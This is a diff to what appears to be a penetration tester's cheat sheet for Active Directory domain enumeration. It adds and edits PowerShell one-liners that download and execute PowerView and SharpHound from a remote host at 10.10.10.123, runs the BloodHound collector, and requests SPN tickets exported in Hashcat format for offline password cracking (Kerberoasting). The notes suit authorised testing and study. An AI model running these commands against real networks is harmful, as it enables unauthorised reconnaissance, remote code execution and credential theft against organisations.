@@ -8,7 +8,7 @@ description: This is just a living document of things I have needed for domain e
 
 Use the `dev` branch or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
 
-`PS  > IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')`
+`IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')`
 
 ### Domain Users
 
@@ -21,6 +21,15 @@ Use the `dev` branch or [PowerSploit](https://github.com/PowerShellMafia/PowerSp
 ### SPN Ticket Request
 
 `Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation`
+
+## BLOODHOUND
+
+### Ingestor Launch
+
+```text
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.123/ps/SharpHound.ps1');
+Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData -SkipPing;
+```
 
 ## 
 
